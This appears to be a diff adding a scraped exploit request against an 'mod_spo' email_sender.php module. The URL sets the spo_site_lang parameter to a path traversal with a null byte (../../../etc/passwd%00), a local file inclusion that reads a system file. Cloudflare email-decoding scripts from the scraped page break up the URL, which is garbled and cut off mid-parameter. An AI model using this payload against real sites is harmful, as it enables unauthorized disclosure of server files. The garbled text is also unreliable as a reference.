@@ -1,0 +1,10 @@
+http://www.xxx.com/home/modules/mod_spo/email_sender.php?also_email_to=sample@email.tst<script type="text/javascript">
+/* <![CDATA[ */
+(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
+/* ]]> */
+</script>&spo_f_email[0]=sample@email.tst<script type="text/javascript">
+/* <![CDATA[ */
+(function(){try{var s,a,i,j,r,c,l=document.getElementById("__cf_email__");a=l.className;if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
+/* ]]> */
+</script>&spo_message=20&spo_msg_ftr=This%20contact%20message%20was%20generated%20using
+%20Simple%20Page%20Options%20Module%20from%20SITEURL.&spo_send_type=&spo_site_lang=../../../../../../../../../../etc/passwd% 00&spo_site_name=Alfredo%20Arauz&spo_url_type=1&spo_url2se
